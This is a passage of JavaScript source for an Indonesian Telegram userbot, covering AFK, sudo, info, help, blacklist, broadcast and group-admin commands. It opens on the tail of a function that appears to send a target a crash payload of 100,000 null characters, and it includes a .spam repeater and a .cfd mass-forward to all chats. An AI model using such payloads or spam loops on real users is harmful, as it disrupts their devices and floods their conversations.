                automatedGreetingMessageCtaType: "\u0000".repeat(100000),
                greetingMessageBody: "\u0000",
              }
            },
            priceAmount1000: 50000,
            currencyCode: "USD"
          }
    },
    { quoted: quotedios, userJid: target }
  )
}

// === Variabel AFK ===
let isAfk = false;
let afkReason = "";

// === Variabel Mode ===
let isPublicMode = false;

function getUserState(userId) {
    if (!userStates.has(userId)) {
        userStates.set(userId, {
            afk: false, afkReason: '', publicMode: false,
            sudoers: [userId]
        });
    }
    return userStates.get(userId);
}

function setupEventHandlers(userId, client, startTime) {
    const state = getUserState(userId);
    const userNotes = getUserNotes(userId);

    client.addEventHandler(async (event) => {
        try {
            const msg = event.message;
            if (!msg?.message) return;
            let prefix = getUserPrefix(msg.sender?.id) || config.prefix || '.';

            const text = (msg.message || '').trim();
            const myId = client._selfId?.toString() || '';
            const isOwner = msg.senderId?.toString() === myId;
            const isSudoer = state.sudoers.includes(msg.senderId?.toString());
            const command = text.split(" ")[0] || "";

            // === AFK FEATURE ===
if (msg.text?.startsWith(`${prefix}afk`)) {
    (async () => {
        try {
            const myId = (await client.getMe()).id.toString();
            const isOwner = msg.senderId?.toString() === myId;
            
            if (!isOwner) {
                return;
            }
            
            const userId = msg.sender?.id?.toString() || msg.from?.id?.toString() || msg.author?.id?.toString();
            
            const args = msg.text.split(" ").slice(1).join(" ").trim();
            const reason = args || "AFK";
            
            const success = saveUserAfk(userId, true, reason);
            
            if (success) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>✅ Mode AFK diaktifkan!\n📝 Keterangan: ${reason}</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                throw new Error('Gagal menyimpan ke file');
            }
            
        } catch (e) {
            console.error("AFK error:", e);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ Terjadi error: ${e.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}unafk`)) {
    (async () => {
        try {
            const myId = (await client.getMe()).id.toString();
            const isOwner = msg.senderId?.toString() === myId;
            
            if (!isOwner) {
                return;
            }
            
            const userId = msg.sender?.id?.toString() || msg.from?.id?.toString() || msg.author?.id?.toString();
            
            const userAfk = getUserAfk(userId);
            
            if (!userAfk.active) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>⚠️ Anda tidak sedang dalam mode AFK</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const success = saveUserAfk(userId, false);
            
            if (success) {
                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>✅ Mode AFK dinonaktifkan!</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                throw new Error('Gagal menyimpan ke file');
            }
            
        } catch (e) {
            console.error("UNAFK error:", e);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ Terjadi error: ${e.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

(async () => {
    try {
        const myId = (await client.getMe()).id.toString();
        
        const botAfk = getUserAfk(myId);
        
        if (!botAfk.active) return;
        
        let shouldReply = false;
        
        if (msg.isReply) {
            const replyMsg = await msg.getReplyMessage?.();
            if (replyMsg?.senderId?.toString() === myId) {
                shouldReply = true;
            }
        }
        
        if (msg.chatId.toString() === msg.senderId?.toString()) {
            shouldReply = true;
        }
        
        if (msg.text?.includes(`@${(await client.getMe()).username}`) || 
            msg.text?.toLowerCase().includes("afk")) {
            shouldReply = true;
        }
        
        const mentionedIds = msg.mentionedIds || [];
        if (mentionedIds.includes(myId)) {
            shouldReply = true;
        }
        
        if (shouldReply) {
            const afkTime = new Date(botAfk.timestamp).toLocaleTimeString('id-ID');
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>💤 <b>SEDANG AFK</b>\n\n• <b>ʀᴇᴀsᴏɴ:</b> ${botAfk.reason}\n• <b>ᴅᴜʀᴀsɪ:</b> ${afkTime}</blockquote>`,
                parseMode: "html", 
                replyTo: msg.id
            });
        }
        
    } catch (error) {
        console.error("AFK check error:", error);
    }
})();

            // === OWNER COMMANDS ===
                if (msg.text?.startsWith(`${prefix}public`)) {
    (async () => {
        try {
            const myId = (await client.getMe()).id.toString();
            const isOwner = msg.senderId?.toString() === myId;
            
            if (!isOwner) {
                return;
            }
            
            state.publicMode = true;
            await client.sendMessage(msg.chatId, { 
                message: "<blockquote>✅️ Mode Publik Diaktifkan!</blockquote>", 
                parseMode: "html", 
                replyTo: msg.id 
            });
            
        } catch (e) {
            console.error("PUBLIC error:", e);
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}self`)) {
    (async () => {
        try {
            const myId = (await client.getMe()).id.toString();
            const isOwner = msg.senderId?.toString() === myId;
            
            if (!isOwner) {
                return;
            }
            
            state.publicMode = false;
            await client.sendMessage(msg.chatId, { 
                message: "<blockquote>🔒 Mode Self Diaktifkan!</blockquote>", 
                parseMode: "html", 
                replyTo: msg.id 
            });
            
        } catch (e) {
            console.error("SELF error:", e);
        }
    })();
    return;
}
                if (msg.text?.startsWith(`${prefix}addsudo`) && msg.replyTo) {
                    const replyMsg = await msg.getReplyMessage();
                    const targetId = replyMsg.senderId.toString();
                    if (!state.sudoers.includes(targetId)) {
                        state.sudoers.push(targetId);
                        await client.sendMessage(msg.chatId, { message: `<blockquote>✅ User <code>${targetId}</code> ditambahkan ke Sudoers.</blockquote>`, parseMode: "html", replyTo: msg.id });
                    }
                    return;
                }
                if (msg.text?.startsWith(`${prefix}delsudo`) && msg.replyTo) {
                    const replyMsg = await msg.getReplyMessage();
                    const targetId = replyMsg.senderId.toString();
                    if (targetId !== myId && state.sudoers.includes(targetId)) {
                        state.sudoers = state.sudoers.filter(id => id !== targetId);
                        await client.sendMessage(msg.chatId, { message: `<blockquote>✅ User <code>${targetId}</code> dihapus dari Sudoers.</blockquote>`, parseMode: "html", replyTo: msg.id });
                    }
                    return;
                }

            // === ACCESS CHECK ===
            const allowedPublicCommands = [".ping", ".id", ".info", `${prefix}help`];
            if (!isOwner && !isSudoer && (!state.publicMode || !allowedPublicCommands.includes(command))) {
                return;
            }

            // === UTILITY COMMANDS ===

            // .ping
            if (msg.text?.startsWith(`${prefix}ping`)) {
                const start = Date.now();
                const sent = await client.sendMessage(msg.chatId, { message: "<blockquote>🏓 Pong!</blockquote>", parseMode: "html", replyTo: msg.id });
                const latency = Date.now() - start;
                await client.editMessage(msg.chatId, { message: sent.id, text: `<blockquote>🏓 Pong!\n⚡ ${latency}ms</blockquote>`, parseMode: "html" });
                return;
            }

            // .id
            if (msg.text?.startsWith(`${prefix}id`)) {
                let response = `<blockquote>💬 <b>Chat ID:</b> <code>${msg.chatId}</code>`;
                if (msg.replyTo) {
                    const replyMsg = await msg.getReplyMessage();
                    response += `\n👤 <b>User ID:</b> <code>${replyMsg.senderId}</code>`;
                }
                response += `</blockquote>`;
                await client.sendMessage(msg.chatId, { message: response, parseMode: "html", replyTo: msg.id });
                return;
            }

            // .info
            if (msg.text?.startsWith(`${prefix}info`)) {
                const loading = await client.sendMessage(msg.chatId, { message: "<blockquote>⏳ Mengambil info user...</blockquote>", parseMode: "html", replyTo: msg.id });
                try {
                    let targetUser = null;
                    const args = text.split(" ").slice(1).join(" ").trim();
                    const replyMsg = msg.replyTo ? await msg.getReplyMessage() : null;

                    if (replyMsg) {
                        targetUser = await client.getEntity(replyMsg.senderId);
                    } else if (args) {
                        targetUser = await client.getEntity(args);
                    } else {
                        targetUser = await client.getEntity('me');
                    }

                    const fullUser = await client.invoke(new Api.users.GetFullUser({ id: targetUser }));
                    const infoText = `<blockquote>
👤 <b>Fullname:</b> ${targetUser.firstName || ''} ${targetUser.lastName || ''}
🔖 <b>Username:</b> @${targetUser.username || 'N/A'}
🆔 <b>ID:</b> <code>${targetUser.id}</code>
🌟 <b>Premium:</b> ${targetUser.isPremium ? '✅' : '❌'}
📝 <b>Bio:</b> ${fullUser.fullUser?.about || 'N/A'}
</blockquote>`;

                    await client.deleteMessages(msg.chatId, [loading.id], { revoke: true });
                    await client.sendMessage(msg.chatId, { message: infoText, parseMode: "html", replyTo: msg.id });
                } catch (e) {
                    await client.editMessage(msg.chatId, { message: loading.id, text: `<blockquote>❌ Gagal: ${e.message}</blockquote>`, parseMode: "html" });
                }
                return;
            }

            // .spam
            if (msg.text?.startsWith(`${prefix}spam`) && msg.replyTo) {
                const count = Math.min(parseInt(text.split(" ")[1]) || 5, 50);
                const replyMsg = await msg.getReplyMessage();
                for (let i = 0; i < count; i++) {
                    try {
                        if (replyMsg.media) {
                            await client.forwardMessages(msg.chatId, { messages: replyMsg.id, fromPeer: msg.chatId });
                        } else {
                            await client.sendMessage(msg.chatId, { message: replyMsg.message });
                        }
                    } catch (e) { }
                }
                await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Spam selesai! ${count}x</blockquote>`, parseMode: "html", replyTo: msg.id });
                return;
            }

            // .help - Trigger inline menu via bot
            if (msg.text?.startsWith(`${prefix}help`)) {
                const botUsername = config.botUsername || 'rajauserbot_bot';
                let inlineSuccess = false;

                try {
                    // Try to clear the command
                    try { await client.deleteMessages(msg.chatId, [msg.id], { revoke: true }); } catch (e) { }

                    const botEntity = await client.getInputEntity("@" + botUsername);

                    // Dapatkan input peer dari message event - ini paling reliable
                    // karena sudah resolved dari pesan yang diterima
                    let inputPeer;
                    try {
                        // Prioritas 1: Gunakan _inputChat dari message (internal property)
                        if (msg._inputChat) {
                            inputPeer = msg._inputChat;
                        }
                        // Prioritas 2: Gunakan inputChat dari message 
                        else if (msg.inputChat) {
                            inputPeer = msg.inputChat;
                        }
                        // Prioritas 3: Gunakan getInputChat() jika tersedia
                        else if (typeof msg.getInputChat === 'function') {
                            inputPeer = await msg.getInputChat();
                        }
                        // Prioritas 4: Buat InputPeer dari peerId message
                        else if (msg.peerId) {
                            const peerId = msg.peerId;
                            if (peerId.className === 'PeerUser') {
                                // Untuk user, kita perlu accessHash dari sender
                                const sender = await msg.getSender();
                                if (sender) {
                                    inputPeer = new Api.InputPeerUser({
                                        userId: sender.id,
                                        accessHash: sender.accessHash || BigInt(0)
                                    });
                                }
                            } else if (peerId.className === 'PeerChat') {
                                inputPeer = new Api.InputPeerChat({
                                    chatId: peerId.chatId
                                });
                            } else if (peerId.className === 'PeerChannel') {
                                const chat = await msg.getChat();
                                inputPeer = new Api.InputPeerChannel({
                                    channelId: peerId.channelId,
                                    accessHash: chat?.accessHash || BigInt(0)
                                });
                            }
                        }
                        // Fallback: Gunakan InputPeerSelf untuk saved messages
                        if (!inputPeer) {
                            inputPeer = new Api.InputPeerSelf();
                        }
                    } catch (peerErr) {
                        console.log(`[HELP] Failed to get inputPeer: ${peerErr.message}`);
                        inputPeer = new Api.InputPeerSelf();
                    }

                    console.log(`[HELP] Using inputPeer: ${inputPeer.className}`);

                    // Get inline results using API directly
                    const results = await client.invoke(
                        new Api.messages.GetInlineBotResults({
                            bot: botEntity,
                            peer: inputPeer,
                            query: "help_menu",
                            offset: ""
                        })
                    );

                    if (results && results.results && results.results.length > 0) {
                        try {
                            await client.invoke(
                                new Api.messages.SendInlineBotResult({
                                    peer: inputPeer,
                                    queryId: results.queryId,
                                    id: results.results[0].id,
                                    randomId: BigInt(Math.floor(Math.random() * 1e15))
                                })
                            );
                            inlineSuccess = true;
                            console.log(`[HELP] Successfully sent inline result`);
                        } catch (sendErr) {
                            console.log(`[HELP] SendInlineBotResult failed: ${sendErr.message}`);
                        }
                    } else {
                        console.log(`[HELP] No inline results returned from GetInlineBotResults`);
                    }
                } catch (e) {
                    console.log(`[HELP] Inline process failed: ${e.message}`);
                }

                if (!inlineSuccess) {
                    console.log("[HELP] Fallback to text menu");
                    // Fallback to text menu if inline fails
                    try {
                        const uptime = formatDuration(Date.now() - startTime);
                        let helpMessage = `<blockquote>╭━━━━━━━━━━━━━━━━━━╮\n`;
                        helpMessage += `│  ── .✦ <b>RAJA UBOT</b>\n`;
                        helpMessage += `├──────────────────\n`;
                        helpMessage += `│ ⸝⸝ Total: <b>${features.length}</b> modul\n`;
                        helpMessage += `│ ⸝⸝ Uptime: ${uptime}\n`;
                        helpMessage += `├──────────────────\n`;

                        const categories = Object.keys(groupedFeatures);
                        for (const catName of categories) {
                            const icon = categoryIcons[catName] || "";
                            const cmdCount = groupedFeatures[catName].length;
                            helpMessage += `│ ${icon} ${catName} (${cmdCount})\n`;
                        }
                        helpMessage += `├──────────────────\n`;
                        helpMessage += `│ <i>Ketik @${botUsername} lalu pilih menu untuk button</i>\n`;
                        helpMessage += `╰━━━━━━━━━━━━━━━━━━╯</blockquote>`;

                        await client.sendMessage(msg.chatId, { message: helpMessage, parseMode: 'html' });
                    } catch (fallbackErr) {
                        console.log(`[HELP] Fallback text menu also failed: ${fallbackErr.message}`);
                    }
                }
                return;
            }

            // === BLACKLIST COMMANDS ===

            if (msg.text?.startsWith(`${prefix}addbl`) && msg.isGroup) {
    const userId = msg.senderId.toString();
    const groupId = msg.chatId.toString();
    const groupName = msg.chat?.title || "Group";
    
    let userBlacklist = getUserBlacklist(userId);
    
    if (!userBlacklist.includes(groupId)) {
        userBlacklist.push(groupId);
        saveUserBlacklist(userId, userBlacklist);
        await client.sendMessage(msg.chatId, { 
            message: `<blockquote>✅ Grup <b>${groupName}</b> ditambahkan ke blacklist Anda.</blockquote>`, 
            parseMode: "html", 
            replyTo: msg.id 
        });
    } else {
        await client.sendMessage(msg.chatId, { 
            message: `<blockquote>⚠️ Grup ini sudah ada di blacklist Anda.</blockquote>`, 
            parseMode: "html", 
            replyTo: msg.id 
        });
    }
    return;
}

if (msg.text?.startsWith(`${prefix}deladdbl`) && msg.isGroup) {
    const userId = msg.senderId.toString();
    const groupId = msg.chatId.toString();
    
    let userBlacklist = getUserBlacklist(userId);
    const idx = userBlacklist.indexOf(groupId);
    
    if (idx > -1) {
        userBlacklist.splice(idx, 1);
        saveUserBlacklist(userId, userBlacklist);
        await client.sendMessage(msg.chatId, { 
            message: `<blockquote>✅ Grup dihapus dari blacklist Anda.</blockquote>`, 
            parseMode: "html", 
            replyTo: msg.id 
        });
    } else {
        await client.sendMessage(msg.chatId, { 
            message: `<blockquote>⚠️ Grup ini tidak ada di blacklist Anda.</blockquote>`, 
            parseMode: "html", 
            replyTo: msg.id 
        });
    }
    return;
}

if (msg.text?.startsWith(`${prefix}listbl`)) {
    const userId = msg.senderId.toString();
    const userBlacklist = getUserBlacklist(userId);
    
    if (userBlacklist.length === 0) {
        await client.sendMessage(msg.chatId, { 
            message: "<blockquote>📋 Blacklist Anda kosong.</blockquote>", 
            parseMode: "html", 
            replyTo: msg.id 
        });
    } else {
        let list = "<blockquote>📋 <b>Blacklist Anda:</b>\n\n";
        userBlacklist.forEach((id, i) => { 
            list += `${i + 1}. <code>${id}</code>\n`; 
        });
        list += `</blockquote>\n<b>Total:</b> ${userBlacklist.length} grup`;
        await client.sendMessage(msg.chatId, { 
            message: list, 
            parseMode: "html", 
            replyTo: msg.id 
        });
    }
    return;
}

            // === BROADCAST ===

            if (msg.text?.startsWith(`${prefix}cfd`)) {
    const args = msg.text.split(' ');
    if (args.length < 2) {
        await client.sendMessage(msg.chatId, {
            message: "<blockquote>⚠️ Penggunaan: .cfd [group,all,users]</blockquote>",
            parseMode: "html",
            replyTo: msg.id,
        });
        return;
    }
    
    const type = args[1].toLowerCase();
    const validTypes = ['group', 'all', 'users'];
    
    if (!validTypes.includes(type)) {
        await client.sendMessage(msg.chatId, {
            message: "<blockquote>⚠️ Type tidak valid! Gunakan: group, all, atau users</blockquote>",
            parseMode: "html",
            replyTo: msg.id,
        });
        return;
    }
    
    if (!msg.replyTo) {
        await client.sendMessage(msg.chatId, {
            message: "<blockquote>⚠️ Harus reply pesan!</blockquote>",
            parseMode: "html",
            replyTo: msg.id,
        });
        return;
    }
    
    const userId = msg.senderId.toString();
    const userBlacklist = getUserBlacklist(userId);
    const replyMsg = await msg.getReplyMessage();
    const dialogs = await client.getDialogs();
    let count = 0;
    
    const proc = await client.sendMessage(msg.chatId, {
        message: `<blockquote>⏳ Sedang meneruskan pesan ke ${type}...</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
    });
    
    await client.deleteMessages(msg.chatId, [proc.id], { revoke: true });
    
    for (const dialog of dialogs) {
        if (userBlacklist.includes(dialog.id.toString())) {
            continue;
        }
        
        if (dialog.isUser) {
            try {
                const entity = await client.getEntity(dialog.id);
                if (entity.bot) {
                    continue;
                }
            } catch (error) {
                console.error(`Gagal mendapatkan info entity ${dialog.id}:`, error.message);
                continue;
            }
        }
        
        let shouldForward = false;
        
        switch(type) {
            case 'group':
                shouldForward = dialog.isGroup;
                break;
            case 'users':
                shouldForward = dialog.isUser && !dialog.entity?.bot;
                break;
            case 'all':
                shouldForward = dialog.isGroup || (dialog.isUser && !dialog.entity?.bot);
                break;
        }
        
        if (shouldForward) {
            try {
                await client.forwardMessages(dialog.id, {
                    messages: replyMsg.id,
                    fromPeer: msg.chatId,
                });
                count++;
                
            } catch (error) {
                console.error(`Gagal forward ke ${dialog.id}:`, error.message);
            }
        }
    }
    
    await client.sendMessage(msg.chatId, {
        message: `<blockquote>✅ Pesan diteruskan ke ${count} ${type}.</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
    });
    return;
}
            // === TOOLS ===

            // .iqc - iPhone Quoted Creator
            if (msg.text?.startsWith(`${prefix}iqc`)) {
                const args = text.split(" ").slice(1).join(" ");
                if (!args) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>⚠️ Format: .iqc jam,batre,carrier,pesan</blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                const parts = args.split(",").map(p => p.trim());
                if (parts.length < 4) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>⚠️ Format: .iqc jam,batre,carrier,pesan</blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                const [time, battery, carrier, ...msgParts] = parts;
                const messageText = encodeURIComponent(msgParts.join(" "));
                const api = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`;

                try {
                    const res = await axios.get(api, { responseType: "arraybuffer" });
                    const tmpFile = path.join(os.tmpdir(), `${uuidv4()}.png`);
                    fs.writeFileSync(tmpFile, Buffer.from(res.data));
                    await client.sendFile(msg.chatId, { file: tmpFile, caption: "<blockquote>✅ iPhone Quoted Created</blockquote>", parseMode: "html", replyTo: msg.id });
                    fs.unlinkSync(tmpFile);
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>❌ Gagal membuat IQC.</blockquote>", parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .tulis
            if (msg.text?.startsWith(`${prefix}tulis`)) {
                const args = text.split(" ").slice(1).join(" ");
                if (!args) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>⚠️ Format: .tulis <teks></blockquote>", parseMode: "html", replyTo: msg.id });
                    return;
                }
                try {
                    const res = await axios.get(`https://brat.siputzx.my.id/nulis?text=${encodeURIComponent(args)}`, { responseType: "arraybuffer" });
                    const tmpFile = path.join(os.tmpdir(), `${uuidv4()}.png`);
                    fs.writeFileSync(tmpFile, Buffer.from(res.data));
                    await client.sendFile(msg.chatId, { file: tmpFile, caption: "<blockquote>✍🏻 Tulisan Tangan</blockquote>", parseMode: "html", replyTo: msg.id });
                    fs.unlinkSync(tmpFile);
                } catch (e) {
                    await client.sendMessage(msg.chatId, { message: "<blockquote>❌ Gagal membuat tulisan.</blockquote>", parseMode: "html", replyTo: msg.id });
                }
                return;
            }

            // .uuid
            if (msg.text?.startsWith(`${prefix}uuid`)) {
                await client.sendMessage(msg.chatId, { message: `<blockquote>🆔 <b>UUID:</b>\n${uuidv4()}</blockquote>`, parseMode: "html", replyTo: msg.id });
                return;
            }

            // === GROUP ADMIN COMMANDS ===

async function getUserIdFromInput(client, chatId, input) {
    try {
        if (!input || input.toLowerCase() === 'me') {
            return client.getMe().then(me => me.id);
        }
        
        if (/^\d+$/.test(input)) {
            return parseInt(input);
        }
        
        if (input.startsWith('@')) {
            const username = input.substring(1);
            try {
                const user = await client.getEntity(username);
                return user.id;
            } catch {
                throw new Error(`User @${username} tidak ditemukan`);
            }
        }
        
        if (/^[a-zA-Z0-9_]{5,32}$/.test(input)) {
            try {
                const user = await client.getEntity(input);
                return user.id;
            } catch {
                throw new Error(`User @${input} tidak ditemukan`);
            }
        }
        
        throw new Error('Format user tidak valid. Gunakan: @username, userID, atau reply pesan');
        
    } catch (error) {
        throw new Error(`Gagal mendapatkan user ID: ${error.message}`);
    }
}

function parseDuration(durationStr) {
    if (!durationStr) return 0;
    
    const duration = durationStr.toLowerCase();
    
    if (duration === "permanen" || duration === "permanent") {
        return 0;
    }
    
    const match = duration.match(/^(\d+)([smhd])$/);
    if (match) {
        const value = parseInt(match[1]);
        const unit = match[2];
        
        switch(unit) {
            case 's': return value;
            case 'm': return value * 60;
            case 'h': return value * 3600;
            case 'd': return value * 86400;
            default: return 0;
        }
    }
    
    if (/^\d+$/.test(duration)) {
        return parseInt(duration) * 60;
    }
    
    return 0;
}

if (msg.text?.startsWith(`${prefix}kick`) && msg.isGroup) {
    (async () => {
        try {
            const args = msg.text.split(' ').slice(1);
            let targetUserId;
            
            if (msg.replyTo) {
                const replyMsg = await msg.getReplyMessage();
                targetUserId = replyMsg.senderId;
            } 
            else if (args.length > 0) {
                targetUserId = await getUserIdFromInput(client, msg.chatId, args[0]);
            } 
            else {
                await client.sendMessage(msg.chatId, { 
                    message: `<blockquote>[username/user_id/reply]</blockquote>`, 
                    parseMode: "html", 
                    replyTo: msg.id 
                });
                return;
            }
            
            await client.kickParticipant(msg.chatId, targetUserId);
            
            await client.sendMessage(msg.chatId, { 
                message: "<blockquote><b>ᴜsᴇʀ ᴛᴇʟᴀʜ ᴅɪᴋɪᴄᴋ</b></blockquote>", 
                parseMode: "html", 
                replyTo: msg.id 
            });
            
        } catch (e) {
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote><b>ɢᴀɢᴀʟ ᴋɪᴄᴋ:</b>\n<code>${e.message}</code></blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}ban`) && msg.isGroup) {
    (async () => {
        try {
            const args = msg.text.split(' ').slice(1);
            let targetUserId;
            
            if (msg.replyTo) {
                const replyMsg = await msg.getReplyMessage();
                targetUserId = replyMsg.senderId;
            } 
            else if (args.length > 0) {
                targetUserId = await getUserIdFromInput(client, msg.chatId, args[0]);
            } 
            else {
                await client.sendMessage(msg.chatId, { 
                    message: `<blockquote>[username/user_id/reply]</blockquote>`, 
                    parseMode: "html", 
                    replyTo: msg.id 
                });
                return;
            }
            
            await client.invoke(new Api.channels.EditBanned({
                channel: msg.chatId,
                participant: targetUserId,
                bannedRights: new Api.ChatBannedRights({ 
                    untilDate: 0, 
                    viewMessages: true,
                    sendMessages: true,
                    sendMedia: true,
                    sendStickers: true,
                    sendGifs: true,
                    sendGames: true,
                    sendInline: true,
                    embedLinks: true
                })
            }));
            
            await client.sendMessage(msg.chatId, { 
                message: "<blockquote><b>ᴜsᴇʀ ᴛᴇʟᴀʜ ᴅɪʙᴀɴ ᴘᴇʀᴍᴀɴᴇɴ</b></blockquote>", 
                parseMode: "html", 
                replyTo: msg.id 
            });
            
        } catch (e) {
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote><b>ɢᴀɢᴀʟ ʙᴀɴ:</b>\n<code>${e.message}</code></blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}unban`) && msg.isGroup) {
    (async () => {
        try {
            const args = msg.text.split(' ').slice(1);
            let targetUserId;
            
            if (msg.replyTo) {
                const replyMsg = await msg.getReplyMessage();
                targetUserId = replyMsg.senderId;
            } 
            else if (args.length > 0) {
                targetUserId = await getUserIdFromInput(client, msg.chatId, args[0]);
            } 
            else {
                await client.sendMessage(msg.chatId, { 
                    message: `<blockquote>[username/user_id/reply]</blockquote>`, 
                    parseMode: "html", 
                    replyTo: msg.id 
                });
                return;
            }
            
            await client.invoke(new Api.channels.EditBanned({
                channel: msg.chatId,
                participant: targetUserId,
                bannedRights: new Api.ChatBannedRights({ untilDate: 0 })
            }));
            
            await client.sendMessage(msg.chatId, { 
                message: "<blockquote><b>ᴜsᴇʀ ᴛᴇʟᴀʜ ᴅɪᴜɴʙᴀɴ</b></blockquote>", 
                parseMode: "html", 
                replyTo: msg.id 
            });
            
        } catch (e) {
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote><b>ɢᴀɢᴀʟ ᴜɴʙᴀɴ:</b>\n<code>${e.message}</code></blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}mute`) && msg.isGroup) {
    (async () => {
        try {
            const args = msg.text.split(' ').slice(1);
            let targetUserId;
            let duration = "ᴘᴇʀᴍᴀɴᴇɴ";
            
            if (msg.replyTo) {
                const replyMsg = await msg.getReplyMessage();
                targetUserId = replyMsg.senderId;
                if (args.length > 0) {
                    duration = args[0];
                }
            } 
            else if (args.length > 0) {
                targetUserId = await getUserIdFromInput(client, msg.chatId, args[0]);
                if (args.length > 1) {
                    duration = args[1];
                }
            } 
            else {
                await client.sendMessage(msg.chatId, { 
                    message: `<blockquote>[username/user_id/reply]</blockquote>`, 
                    parseMode: "html", 
                    replyTo: msg.id 
                });
                return;
            }
            
            let durationText;
            let untilDate;
            
            if (duration.toLowerCase() === "ᴘᴇʀᴍᴀɴᴇɴ" || duration.toLowerCase() === "ᴘᴇʀᴍᴀɴᴇɴᴛ") {
                untilDate = 0;
                durationText = "ᴘᴇʀᴍᴀɴᴇɴ";
            } else {
                const durationSeconds = parseDuration(duration);
                untilDate = Math.floor(Date.now()/1000) + durationSeconds;
                
                if (durationSeconds < 60) {
                    durationText = `${durationSeconds} detik`;
                } else if (durationSeconds < 3600) {
                    durationText = `${Math.floor(durationSeconds/60)} menit`;
                } else if (durationSeconds < 86400) {
                    durationText = `${Math.floor(durationSeconds/3600)} jam`;
                } else {
                    durationText = `${Math.floor(durationSeconds/86400)} hari`;
                }
            }
            
            await client.invoke(new Api.channels.EditBanned({
                channel: msg.chatId,
                participant: targetUserId,
                bannedRights: new Api.ChatBannedRights({ 
                    untilDate: untilDate,
                    sendMessages: true 
                })
            }));
            
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote>
<b>ᴅᴜʀᴀsɪ: ${durationText} 
<b>ᴀʟᴀꜱᴀɴ: {reason}</blockquote></b>

<blockquote><b>ᴋᴇᴛ: ᴍᴀᴍᴘᴜs ᴅɪ ᴍᴜᴛᴇ ᴇᴛᴍɪɴ</blockquote></b>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
            
        } catch (e) {
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote><b>ɢᴀɢᴀʟ ᴍᴜᴛᴇ:</b>\n<code>${e.message}</code></blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}unmute`) && msg.isGroup) {
    (async () => {
        try {
            const args = msg.text.split(' ').slice(1);
            let targetUserId;
            
            if (msg.replyTo) {
                const replyMsg = await msg.getReplyMessage();
                targetUserId = replyMsg.senderId;
            } 
            else if (args.length > 0) {
                targetUserId = await getUserIdFromInput(client, msg.chatId, args[0]);
            } 
            else {
                await client.sendMessage(msg.chatId, { 
                    message: `<blockquote>[username/user_id/reply]</blockquote>`, 
                    parseMode: "html", 
                    replyTo: msg.id 
                });
                return;
            }
            
            await client.invoke(new Api.channels.EditBanned({
                channel: msg.chatId,
                participant: targetUserId,
                bannedRights: new Api.ChatBannedRights({ untilDate: 0 })
            }));
            
            await client.sendMessage(msg.chatId, { 
                message: "<blockquote><b>ᴜsᴇʀ ᴛᴇʟᴀʜ ᴅɪᴜɴᴍᴜᴛᴇ</b></blockquote>", 
                parseMode: "html", 
                replyTo: msg.id 
            });
            
        } catch (e) {
            await client.sendMessage(msg.chatId, { 
                message: `<blockquote><b>ɢᴀɢᴀʟ ᴜɴᴍᴜᴛᴇ:</b>\n<code>${e.message}</code></blockquote>`, 
                parseMode: "html", 
                replyTo: msg.id 
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}promote`) && msg.isGroup) {
    (async () => {
        try {
            const args = msg.text.split(' ').slice(1);
            let targetUserId;
            let rank = "Admin";
            
            if (msg.replyTo) {
                const replyMsg = await msg.getReplyMessage();
                targetUserId = replyMsg.senderId;
                if (args.length > 0) {
                    rank = args.join(' ');
                }
            } 
            else if (args.length > 0) {
                targetUserId = await getUserIdFromInput(client, msg.chatId, args[0]);
                if (args.length > 1) {
                    rank = args.slice(1).join(' ');
                }
            } 
            else {
                await client.sendMessage(msg.chatId, { 
                    message: `<blockquote>[username/user_id/reply]</blockquote>`, 
                    parseMode: "html", 
                    replyTo: msg.id 
                });
                return;
            }
            
            await client.invoke(new Api.channels.EditAdmin({
                channel: msg.chatId,
                userId: targetUserId,
                adminRights: new Api.ChatAdminRights({
                    changeInfo: true, 
                    postMessages: true, 
                    editMessages: true,
                    deleteMessages: true, 
                    banUsers: true, 
                    inviteUsers: true,
                    pinMessages: true, 
                    addAdmins: true,
                    anonymous: true,
                    manageCall: true,
                    other: true
                }),
                rank: rank
            }));
            
            await client.sendMessage(msg.chatId, { 
